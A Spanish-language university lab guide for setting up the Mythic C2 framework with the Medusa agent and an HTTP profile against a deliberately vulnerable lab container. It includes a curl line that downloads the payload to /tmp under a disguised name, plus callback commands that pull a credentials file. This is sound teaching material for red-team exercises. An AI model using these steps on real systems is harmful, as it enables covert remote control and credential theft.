# Guía de Instalación de Mythic C2 (Rol 3 — Operador C2)

**Curso MAR303 — Universidad Mayor — 2026**

Mythic corre en la máquina del estudiante Operador C2 (no dentro del compose
del lab) y se comunica con la máquina víctima a través de `host.docker.internal`.

---

## Requisitos

- Docker Desktop v24+ corriendo (macOS o Windows)
- **8 GB de RAM libres** (Mythic usa ~4 GB)
- ~10 GB de disco
- Git

> **macOS Apple Silicon:** habilita en Docker Desktop → Settings → General →
> "Use Rosetta for x86_64/amd64 emulation". Algunas imágenes de Mythic son
> amd64 y Rosetta las hace mucho más rápidas.

---

## Paso 1 — Instalar Mythic

```bash
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
```

Configura la contraseña del portal editando `Mythic/.env`:

```ini
MYTHIC_ADMIN_PASSWORD="VulnCorp2026!"
```

> Cambia esta contraseña y NO la uses fuera del laboratorio.

Construye y arranca:

```bash
./mythic-cli build        # macOS/Linux
# En Windows PowerShell:
# .\mythic-cli build
```

```bash
./mythic-cli start
```

Verifica: https://127.0.0.1:7443 → usuario `mythicAdmin` (o `admin`) y la
contraseña configurada.

---

## Paso 2 — Instalar el agente Medusa

Mythic **no trae agentes preinstalados**. Instala Medusa:

```bash
./mythic-cli install github https://github.com/MythicAgents/Medusa
./mythic-cli build
./mythic-cli start
```

(Medusa es el agente Python que correrá en la máquina víctima. Si quieres
comparar agentes en el informe, puedes instalar también Poseidon — Go, binario
estático — con el mismo comando apuntando a `MythicAgents/Poseidon`.)

---

## Paso 3 — Instalar el perfil C2 HTTP

```bash
./mythic-cli install github https://github.com/MythicC2Profiles/http
./mythic-cli build
./mythic-cli start
```

El perfil http escucha por defecto en el puerto **80** del host de Mythic.
Si el puerto 80 está ocupado en tu máquina, revisa el mapeo en
`InstalledServices/http/docker-compose.yml` y usa otro puerto (ej: 8080),
anotándolo para configurar el payload igual.

Verifica que está corriendo:

```bash
docker ps | grep http
```

---

## Paso 4 — Conectividad con la víctima

La máquina víctima es un contenedor Docker **dentro del compose del Lab 03**
en otra máquina (o en la misma). No puede alcanzar `localhost` de tu máquina.
Docker Desktop resuelve el nombre especial **`host.docker.internal`** hacia el
host en Mac y Windows — esa es la dirección de callback que debes usar.

Desde un terminal del noVNC del lab (http://localhost:6080):

```bash
# Si Mythic corre en el MISMO computador que el lab:
curl -s -o /dev/null -w "%{http_code}\n" http://host.docker.internal:80
# Debe responder un código HTTP (200/302/404...), no "connection refused"

# Si Mythic corre en OTRA máquina (el computador del Operador C2):
# usa la IP de esa máquina en la red local, ej:
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.1.50:80
```

> ⚠️ Si Mythic corre en otra máquina: esa máquina debe exponer el puerto del
> perfil http en su red local, y el firewall debe permitirlo.

---

## Paso 5 — Generar el payload Medusa

En la UI de Mythic:

1. **Payloads → + New Payload** → tipo `medusa`
2. Configura:
   - **OS:** Linux
   - **C2 profile:** `http`
   - **callback_host:** `host.docker.internal` (o la IP del paso 4)
   - **callback_port:** `80` (o el puerto que mapeaste)
   - **wrap_integrity:** por defecto
3. Build → descarga el binario generado.
4. Calcula y anota el hash (cadena de custodia):
   ```bash
   shasum -a 256 medusa_linux_x64        # macOS
   Get-FileHash medusa_linux_x64         # Windows PowerShell
   ```
5. Entrega el binario al Explotador junto con la URL para descargarlo desde
   la víctima. Dos opciones:
   - **Opción A (recomendada):** en Mythic, usa el hosting de payloads
     (payloads descargables vía el portal) o sube el binario a cualquier
     servidor HTTP local: `python3 -m http.server 8000` en la carpeta del
     payload, y la víctima lo baja con:
     `curl -o /tmp/updates http://host.docker.internal:8000/medusa`
   - **Opción B:** el Explotador lo sube por la vulnerabilidad de FileUpload.

---

## Paso 6 — Verificar el callback

Cuando el Explotador ejecute el payload en la víctima, en Mythic aparece un
callback nuevo con hostname `petashop-inventory`. Prueba:

```text
shell  →  whoami
shell  →  ls /opt/petashop
download  →  /opt/petashop/credenciales_bodega.txt
```

---

## Solución de problemas

| Problema | Solución |
|----------|----------|
| `./mythic-cli` no ejecuta | `chmod +x mythic-cli` (macOS/Linux); en Windows usa PowerShell |
| Mythic no arranca | `docker info` activo? 8 GB RAM? Revisa `./mythic-cli logs` |
| No aparece Medusa en payloads | Reinstala con `./mythic-cli build && ./mythic-cli start` |
| La víctima no alcanza el callback | ¿Firewall del host? ¿Puerto mapeado? Prueba `curl` desde el noVNC (Paso 4) |
| Callback entra pero muere | Verifica que el perfil http esté iniciado dentro de Mythic (C2 Profiles → start) |
